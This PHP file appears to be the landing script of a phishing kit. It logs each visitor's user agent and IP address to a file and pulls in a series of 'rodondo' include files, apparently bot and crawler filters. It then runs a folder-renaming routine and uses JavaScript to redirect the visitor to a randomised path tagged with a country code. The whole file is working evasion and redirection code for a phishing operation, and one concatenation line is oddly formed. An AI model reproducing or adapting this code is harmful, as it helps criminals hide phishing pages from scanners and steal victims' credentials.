<?php
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
date_default_timezone_set('GMT');
$line1 = ($_SERVER['HTTP_USER_AGENT']) .  -  $line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('bots-click.cs', $line1 . $line . PHP_EOL, FILE_APPEND);
//------------------------------------------------------------------------- INC
include('../bit/rodondoAllock.php');
include('../bit/rodondo1.php');
include('../bit/rodondo2.php');
include('../bit/rodondo3.php');
include('../bit/rodondo4.php');
include('../bit/rodondo5.php');
include('../bit/rodondo6.php');
include('../bit/rodondo7.php');
include('../bit/rodondo8.php');
//---------------------------------------------------------------------------------------- VAR
	$An = 'id='.rand(99, 100000000);
	$xcod = (empty($_SESSION['AYCOUNTCODE'])) ? '' : 'code='.$_SESSION['AYCOUNTCODE'].'&';
	$xbla = (empty($_SESSION['AYCOUNT'])) ? '' : '&country='.$_SESSION['AYCOUNT'];
//---------------------------------------------------------------------------------------- RNM
	Badal_smiya();
//---------------------------------------------------------------------------------------- FIN
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<script language="javascript">
var sirawdi = "./<?php echo Jib_milaf().$xcod.$An.$xbla ; ?>"        
top.location = sirawdi;
</script> 
</head>
</html>